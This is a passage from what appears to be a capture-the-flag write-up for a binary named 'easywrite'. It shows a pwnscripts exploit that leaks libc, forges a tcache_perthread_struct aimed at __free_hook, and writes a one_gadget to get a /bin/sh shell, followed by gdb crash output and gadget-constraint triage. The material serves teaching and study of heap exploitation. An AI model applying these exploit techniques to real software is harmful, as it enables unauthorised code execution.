+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;easywrite&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc_database</span> <span class=o>=</span> <span class=s1>&#39;libc-database&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc-2.31.so&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>calc_base</span><span class=p>(</span><span class=s1>&#39;setbuf&#39;</span><span class=p>,</span> <span class=n>unpack_hex</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tcache_perthread_struct</span><span class=p>(</span><span class=n>fake_ptrs</span><span class=p>:</span> <span class=nb>dict</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;fake_ptrs has (address: size) key-pairs&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>csize2tidx</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>//</span><span class=mi>16</span> <span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>TCACHE_MAX_BINS</span> <span class=o>=</span> <span class=mh>0x40</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>counts</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>TCACHE_MAX_BINS</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=n>entries</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>TCACHE_MAX_BINS</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>addr</span><span class=p>,</span><span class=n>size</span> <span class=ow>in</span> <span class=n>fake_ptrs</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>tidx</span> <span class=o>=</span> <span class=n>csize2tidx</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>counts</span><span class=p>[</span><span class=n>tidx</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=n>entries</span><span class=p>[</span><span class=n>tidx</span><span class=p>]</span> <span class=o>=</span> <span class=n>addr</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p16</span><span class=p>,</span><span class=n>counts</span><span class=p>))</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p64</span><span class=p>,</span><span class=n>entries</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>SIZE</span> <span class=o>=</span> <span class=mh>0x40</span> <span class=c1># size of the 2nd allocation</span>
+</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=mh>0x00000000001EEB28</span><span class=o>+</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span>
+</span></span><span class=line><span class=cl><span class=n>tcache_pointer</span> <span class=o>=</span> <span class=mh>0x7facf8666530</span><span class=o>-</span><span class=mh>0x00007facf8473000</span> <span class=o>+</span> <span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span>
+</span></span><span class=line><span class=cl><span class=n>fake_tcache</span> <span class=o>=</span> <span class=n>tcache_perthread_struct</span><span class=p>({</span><span class=n>free_hook</span><span class=p>:</span> <span class=n>SIZE</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Input your message:&#39;</span><span class=p>,</span> <span class=n>fake_tcache</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Where to write?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>tcache_pointer</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Any last message?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>select_gadget</span><span class=p>(</span><span class=mi>1</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>And we get a shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl> <span class=n>stack</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Unmapped</span> <span class=n>address</span>
+</span></span><span class=line><span class=cl> <span class=nl>code</span><span class=p>:</span><span class=nl>x86</span><span class=p>:</span><span class=mi>64</span> 
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f792a05bda9</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1337</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>rax</span><span class=p>,</span> <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x68</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f792a05bdad</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1341</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x48</span><span class=p>],</span> <span class=n>rax</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f792a05bdb1</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1345</span><span class=o>&gt;</span>   <span class=n>jmp</span>    <span class=mh>0x7f792a05bcdb</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1131</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl> <span class=err>→</span> <span class=mh>0x7f792a05bdb6</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1350</span><span class=o>&gt;</span>   <span class=n>call</span>   <span class=mh>0x7f792a0a7970</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>↳</span>  <span class=mh>0x7f792a0a7970</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>+</span><span class=mi>0</span><span class=o>&gt;</span> <span class=n>endbr64</span>
+</span></span><span class=line><span class=cl>      <span class=mh>0x7f792a0a7974</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>+</span><span class=mi>4</span><span class=o>&gt;</span> <span class=n>push</span>   <span class=n>rax</span>
+</span></span><span class=line><span class=cl>      <span class=mh>0x7f792a0a7975</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>+</span><span class=mi>5</span><span class=o>&gt;</span> <span class=n>pop</span>    <span class=n>rax</span>
+</span></span><span class=line><span class=cl>      <span class=mh>0x7f792a0a7976</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>+</span><span class=mi>6</span><span class=o>&gt;</span> <span class=n>lea</span>    <span class=n>rdi</span><span class=p>,</span> <span class=p>[</span><span class=n>rip</span><span class=o>+</span><span class=mh>0x876e7</span><span class=p>]</span>        <span class=err>#</span> <span class=mh>0x7f792a12f064</span>
+</span></span><span class=line><span class=cl>      <span class=mh>0x7f792a0a797d</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>+</span><span class=mi>13</span><span class=o>&gt;</span> <span class=n>sub</span>    <span class=n>rsp</span><span class=p>,</span> <span class=mh>0x8</span>
+</span></span><span class=line><span class=cl>      <span class=mh>0x7f792a0a7981</span> <span class=o>&lt;</span><span class=n>__stack_chk_fail</span><span class=o>+</span><span class=mi>17</span><span class=o>&gt;</span> <span class=n>call</span>   <span class=mh>0x7f792a0a7990</span> <span class=o>&lt;</span><span class=n>__fortify_fail</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl> <span class=n>arguments</span> <span class=p>(</span><span class=n>guessed</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl><span class=n>__stack_chk_fail</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl> <span class=n>threads</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=n>Id</span> <span class=mi>1</span><span class=p>,</span> <span class=nl>Name</span><span class=p>:</span> <span class=s>&#34;ld-linux-x86-64&#34;</span><span class=p>,</span> <span class=n>stopped</span> <span class=mh>0x7f792a05bdb6</span> <span class=n>in</span> <span class=n>execvpe</span> <span class=p>(),</span> <span class=nl>reason</span><span class=p>:</span> <span class=n>SIGSEGV</span>
+</span></span><span class=line><span class=cl> <span class=n>trace</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=mh>0x7f792a05bdb6</span> <span class=err>→</span> <span class=n>execvpe</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>1</span><span class=p>]</span> <span class=mh>0x7f7929f9c0b3</span> <span class=err>→</span> <span class=n>__libc_start_main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>2</span><span class=p>]</span> <span class=mh>0x7f792a16a17e</span> <span class=err>→</span> <span class=n>hlt</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>3</span><span class=p>]</span> <span class=mh>0x7ffe534a51a8</span> <span class=err>→</span> <span class=n>sbb</span> <span class=n>al</span><span class=p>,</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>
+</span></span></code></pre></td></tr></table></div></div><p>Wait, what?</p><h2 id=triage>Triage</h2><p>We&rsquo;ll modify the code a little bit to stop at the one_gadget:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>oneg</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>select_gadget</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=s1>&#39;b *&#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>oneg</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>c&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Any last message?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>oneg</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>gdb</code> is enlightening:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=err>$</span><span class=nl>rax</span>   <span class=p>:</span> <span class=mh>0x00007f98a3e18ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rbx</span>   <span class=p>:</span> <span class=mh>0x00007f98a3f273a0</span>  <span class=err>→</span>  <span class=mh>0x8d4c5741fa1e0ff3</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rcx</span>   <span class=p>:</span> <span class=mh>0x00007f98a3e42fb2</span>  <span class=err>→</span>  <span class=mh>0x5677fffff0003d48</span> <span class=p>(</span><span class=s>&#34;H=&#34;</span><span class=o>?</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rdx</span>   <span class=p>:</span> <span class=mh>0x2f</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rsp</span>   <span class=p>:</span> <span class=mh>0x00007ffe510e5638</span>  <span class=err>→</span>  <span class=mh>0x00007f98a3f27376</span>  <span class=err>→</span>  <span class=mh>0x4d8b4800000000b8</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rbp</span>   <span class=p>:</span> <span class=mh>0x00007ffe510e5660</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rsi</span>   <span class=p>:</span> <span class=mh>0x00007f98a3f27376</span>  <span class=err>→</span>  <span class=mh>0x4d8b4800000000b8</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rdi</span>   <span class=p>:</span> <span class=mh>0x00007f98a3f20b28</span>  <span class=err>→</span>  <span class=mh>0x00007f98a3e18ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rip</span>   <span class=p>:</span> <span class=mh>0x00007f98a3e18ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r8</span>    <span class=p>:</span> <span class=mh>0x00007f98a3f20b28</span>  <span class=err>→</span>  <span class=mh>0x00007f98a3e18ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r9</span>    <span class=p>:</span> <span class=mh>0x00007f98a3d39548</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r10</span>   <span class=p>:</span> <span class=mh>0x00007f98a3f1dbe0</span>  <span class=err>→</span>  <span class=mh>0x0000555555ab55a0</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r11</span>   <span class=p>:</span> <span class=mh>0x246</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r12</span>   <span class=p>:</span> <span class=mh>0x00007f98a3f27150</span>  <span class=err>→</span>  <span class=mh>0x8949ed31fa1e0ff3</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r13</span>   <span class=p>:</span> <span class=mh>0x00007ffe510e5748</span>  <span class=err>→</span>  <span class=mh>0x000000000000001c</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r14</span>   <span class=p>:</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r15</span>   <span class=p>:</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>eflags</span><span class=p>:</span> <span class=p>[</span><span class=n>zero</span> <span class=n>carry</span> <span class=n>parity</span> <span class=n>adjust</span> <span class=n>sign</span> <span class=n>trap</span> <span class=n>INTERRUPT</span> <span class=n>direction</span> <span class=n>overflow</span> <span class=n>resume</span> <span class=n>virtualx86</span> <span class=n>identification</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>cs</span><span class=p>:</span> <span class=mh>0x0033</span> <span class=err>$</span><span class=nl>ss</span><span class=p>:</span> <span class=mh>0x002b</span> <span class=err>$</span><span class=nl>ds</span><span class=p>:</span> <span class=mh>0x0000</span> <span class=err>$</span><span class=nl>es</span><span class=p>:</span> <span class=mh>0x0000</span> <span class=err>$</span><span class=nl>fs</span><span class=p>:</span> <span class=mh>0x0000</span> <span class=err>$</span><span class=nl>gs</span><span class=p>:</span> <span class=mh>0x0000</span>
+</span></span><span class=line><span class=cl> <span class=n>stack</span> 
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5638</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0000</span><span class=o>:</span> <span class=mh>0x00007f98a3f27376</span>  <span class=err>→</span>  <span class=mh>0x4d8b4800000000b8</span>    <span class=err>←</span> <span class=err>$</span><span class=n>rsp</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5640</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0008</span><span class=o>:</span> <span class=mh>0x00007f98a3f25530</span>  <span class=err>→</span>  <span class=mh>0x0000555555ab52a0</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5648</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0010</span><span class=o>:</span> <span class=mh>0x0000555555ab52a0</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5650</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0018</span><span class=o>:</span> <span class=mh>0x00007f98a3f20b28</span>  <span class=err>→</span>  <span class=mh>0x00007f98a3e18ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5658</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0020</span><span class=o>:</span> <span class=mh>0x0caf9f8a935f0f00</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5660</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0028</span><span class=o>:</span> <span class=mh>0x0000000000000000</span>   <span class=err>←</span> <span class=err>$</span><span class=n>rbp</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5668</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0030</span><span class=o>:</span> <span class=mh>0x00007f98a3d590b3</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>__libc_start_main</span><span class=o>+</span><span class=mi>243</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>edi</span><span class=p>,</span> <span class=n>eax</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007ffe510e5670</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0038</span><span class=o>:</span> <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl> <span class=nl>code</span><span class=p>:</span><span class=nl>x86</span><span class=p>:</span><span class=mi>64</span> 
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18cd8</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1128</span><span class=o>&gt;</span>   <span class=n>add</span>    <span class=n>DWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=mh>0x52</span><span class=p>],</span> <span class=n>esi</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18cdb</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1131</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>r10</span><span class=o>+</span><span class=mh>0x10</span><span class=p>],</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18ce3</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1139</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>rdx</span><span class=p>,</span> <span class=n>r12</span>
+</span></span><span class=line><span class=cl> <span class=err>→</span> <span class=mh>0x7f98a3e18ce6</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18ce9</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1145</span><span class=o>&gt;</span>   <span class=n>lea</span>    <span class=n>rdi</span><span class=p>,</span> <span class=p>[</span><span class=n>rip</span><span class=o>+</span><span class=mh>0xd08ba</span><span class=p>]</span>        <span class=err>#</span> <span class=mh>0x7f98a3ee95aa</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18cf0</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1152</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x78</span><span class=p>],</span> <span class=n>r11</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18cf4</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1156</span><span class=o>&gt;</span>   <span class=n>call</span>   <span class=mh>0x7f98a3e18160</span> <span class=o>&lt;</span><span class=n>execve</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18cf9</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1161</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>r11</span><span class=p>,</span> <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x78</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f98a3e18cfd</span> <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1165</span><span class=o>&gt;</span>   <span class=n>mov</span>    <span class=n>eax</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>PTR</span> <span class=nl>fs</span><span class=p>:[</span><span class=n>r14</span><span class=p>]</span>
+</span></span><span class=line><span class=cl> <span class=n>threads</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=n>Id</span> <span class=mi>1</span><span class=p>,</span> <span class=nl>Name</span><span class=p>:</span> <span class=s>&#34;ld-linux-x86-64&#34;</span><span class=p>,</span> <span class=n>stopped</span> <span class=mh>0x7f98a3e18ce6</span> <span class=n>in</span> <span class=n>execvpe</span> <span class=p>(),</span> <span class=nl>reason</span><span class=p>:</span> <span class=n>BREAKPOINT</span>
+</span></span></code></pre></td></tr></table></div></div><p>The one_gadget requirements here probably failed. These are the three<sup>4</sup> gadgets available:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mh>0xe6ce3</span> <span class=n>execve</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>r10</span><span class=p>,</span> <span class=n>r12</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>constraints</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>r10</span><span class=p>]</span> <span class=o>==</span> <span class=n>NULL</span> <span class=o>||</span> <span class=n>r10</span> <span class=o>==</span> <span class=n>NULL</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>r12</span><span class=p>]</span> <span class=o>==</span> <span class=n>NULL</span> <span class=o>||</span> <span class=n>r12</span> <span class=o>==</span> <span class=n>NULL</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mh>0xe6ce6</span> <span class=n>execve</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>r10</span><span class=p>,</span> <span class=n>rdx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>constraints</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>r10</span><span class=p>]</span> <span class=o>==</span> <span class=n>NULL</span> <span class=o>||</span> <span class=n>r10</span> <span class=o>==</span> <span class=n>NULL</span>
+</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=n>rdx</span><span class=p>]</span> <span class=o>==</span> <span class=n>NULL</span> <span class=o>||</span> <span class=n>rdx</span> <span class=o>==</span> <span class=n>NULL</span>
+</span></span><span class=line><span class=cl>
